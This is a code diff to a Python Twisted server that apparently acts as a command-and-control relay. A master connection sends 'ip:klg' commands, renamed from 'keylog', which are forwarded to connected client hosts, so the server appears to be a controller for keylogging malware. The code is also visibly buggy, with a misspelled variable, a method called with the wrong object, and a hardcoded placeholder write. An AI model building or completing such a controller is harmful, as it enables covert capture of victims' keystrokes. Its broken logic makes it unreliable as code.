@@ -11,6 +11,7 @@ class echoClient(protocol.Protocol):
     def connectionMade(self):
         global cnt_clients
         global glob_ip
+        global message
         self.peer_host = self.transport.getPeer().host
         self.peer_port = self.transport.getPeer().port
         self.conc = [self.peer_host, str(self.peer_port)]
@@ -20,6 +21,7 @@ class echoClient(protocol.Protocol):
         cnt_clients += 1
         print('[%s]Clients status' %(cnt_clients))
         print('[*] Peer connected: '+str(glob_ip))
+        #self.sendMessage(message)
 
     def connectionLost(self, reason):
         global cnt_clients
@@ -30,8 +32,12 @@ class echoClient(protocol.Protocol):
         print('[%s] Client status ' %(cnt_clients))
         print('[*] Peer connected: '+str(glob_ip))
 
-    def sendMessage(self, message):
-        print(message)
+    def sendMessage(self, msg):
+        print('message to client' +str(msg))
+        self.transport.write(b'ciao')
+        #for key in message:
+        #    if message[key] == self.peer_host:
+        #        self.transport.write(messagge[key])
 
 class clientFactory(protocol.Factory):
     def buildProtocol(self, addr):
@@ -46,18 +52,22 @@ class echoMaster(protocol.Protocol):
         self.transport.write(glob_ip_b.encode('utf-8'))
 
     def dataReceived(self, data):
-        print(data.decode('utf-8'))
-        parseData(data)
+        self.parseData(data)
 
     def connectionLost(self, reason):
         print('*- Master [%s] disconnected -*' %(self.master_host))
     
-    def parseData(data):
+    def parseData(self, data):
+        print(data)
+        global message
+        data = data.decode('utf-8')
         p_data = data.split(':')
         peer_ip = p_data[0]
         peer_msg = p_data[1]
-        if peer_msg == 'keylog':
-            message[peer_ip] = peer_msg
+        if peer_msg == 'klg':
+            msg = message[peer_ip] = peer_msg
+            echoClient.sendMessage(self, msg)              
+        print(message)
 
 class masterFactory(protocol.Factory):
     def buildProtocol(self, addr):
